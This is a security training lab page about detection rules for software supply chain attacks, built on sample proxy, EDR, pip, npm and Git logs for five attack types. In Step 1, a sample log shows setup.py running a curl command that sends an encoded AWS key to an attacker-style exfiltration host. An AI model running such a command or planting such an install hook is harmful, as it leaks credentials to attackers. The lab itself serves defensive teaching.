# Lab 7.1: Building Detection Rules for Supply Chain Attacks

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Investigate</span>
  <span class="phase-arrow">›</span>
  <a href="../validate/" class="phase-step upcoming">Validate</a>
  <span class="phase-arrow">›</span>
  <a href="../improve/" class="phase-step upcoming">Improve</a>
</div>

**Goal:** Analyze pre-generated log samples from each Tier 1 attack type and identify the indicators of compromise.

## Step 1: Dependency confusion log indicators

**Proxy log. pip fetching internal package name from public PyPI:**

```log
2026-04-01T14:22:31Z squid[2847]: TCP_MISS/200 24871 GET https://pypi.org/simple/wl-auth/ - DIRECT/151.101.128.223 text/html
2026-04-01T14:22:32Z squid[2847]: TCP_MISS/200 185732 GET https://pypi.org/packages/wl-auth/wl_auth-99.0.0.tar.gz - DIRECT/151.101.128.223 application/gzip
```

**EDR log. setup.py spawning suspicious child process:**

```json
{
  "timestamp": "2026-04-01T14:22:35Z",
  "host": "ci-runner-07",
  "event_type": "process_create",
  "parent": {"pid": 4821, "name": "python3", "cmdline": "python3 setup.py install"},
  "process": {"pid": 4835, "name": "curl", "cmdline": "curl -s https://exfil.attacker.com/c?d=QVdTX0FDQ0VTU19LRVk9QUtJQUl..."},
  "grandparent": {"pid": 4790, "name": "pip3", "cmdline": "pip3 install -r requirements.txt"}
}
```

## Step 2: Typosquatting log indicators

```log
2026-04-01T15:10:02Z pip[3201]: Collecting reqeusts
2026-04-01T15:10:02Z pip[3201]: Downloading https://pypi.org/packages/reqeusts/reqeusts-2.31.0.tar.gz (142 kB)
2026-04-01T15:10:03Z pip[3201]: Running setup.py install for reqeusts
```

**Key indicator:** Package name is a known misspelling of a popular package. Maintain a lookup table of popular packages and their common typos.

## Step 3: Lockfile injection log indicators

```log
2026-04-01T16:30:00Z github: pull_request.files_changed
  - path: package-lock.json, status: modified, additions: 47, deletions: 2
  - path: src/app.js, status: modified, additions: 3, deletions: 1
  # NOTE: package.json NOT in changed files list
```

## Step 4: Manifest confusion log indicators

```log
2026-04-01T17:00:12Z npm[5501]: http fetch GET 200 https://registry.npmjs.org/safe-helper 28ms
2026-04-01T17:00:12Z npm[5501]: silly extract safe-helper@1.2.0 extracted to /tmp/.npm/_cacache/
2026-04-01T17:00:13Z npm[5501]: warn ERESOLVE overriding peer dependency
```

**Key indicator:** The package name in the registry metadata does not match the `name` field in the tarball's `package.json`.

## Step 5: Phantom dependency log indicators

```log
2026-04-01T18:00:00Z ci-runner: ModuleNotFoundError: No module named 'phantom_util'
2026-04-01T18:00:00Z ci-runner: # Package 'webapp' imports 'phantom_util' but it is not in requirements.txt
```

---

???+ success "Checkpoint"
    You should now be able to identify IOCs for all five Tier 1 attack types across proxy, EDR, CI/CD, and Git audit logs. If any attack type's indicators are unclear, review the corresponding Tier 1 lab before continuing.
